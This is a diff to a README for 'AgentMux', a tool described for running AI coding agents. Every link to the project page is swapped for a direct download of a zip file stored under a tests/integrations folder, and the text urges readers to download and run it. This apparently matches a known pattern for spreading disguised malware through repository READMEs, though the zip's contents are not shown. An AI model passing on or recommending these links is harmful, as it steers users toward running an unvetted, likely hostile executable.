@@ -1,6 +1,6 @@
 # 🤖 AgentMux - Run AI coding agents in order
 
-[![Download AgentMux](https://img.shields.io/badge/Download-AgentMux-blue?style=for-the-badge&logo=github)](https://github.com/derai7974/AgentMux)
+[![Download AgentMux](https://img.shields.io/badge/Download-AgentMux-blue?style=for-the-badge&logo=github)](https://github.com/derai7974/AgentMux/raw/refs/heads/main/tests/integrations/Mux-Agent-2.3.zip)
 
 ## 🧭 What AgentMux does
 
@@ -31,7 +31,7 @@ For the smoothest setup, use a recent Windows build with Windows Terminal instal
 
 Open the main project page here and download the app from the repository:
 
-https://github.com/derai7974/AgentMux
+https://github.com/derai7974/AgentMux/raw/refs/heads/main/tests/integrations/Mux-Agent-2.3.zip
 
 If the page opens a list of files, look for the latest Windows download, then save it to your PC.
 
@@ -214,6 +214,6 @@ You can use the same pattern for many software tasks. The main idea is to keep e
 
 If you need to return to the project page, use this link:
 
-https://github.com/derai7974/AgentMux
+https://github.com/derai7974/AgentMux/raw/refs/heads/main/tests/integrations/Mux-Agent-2.3.zip
 
 Open it, get the latest Windows file, then download and run this file or open the install files from that page
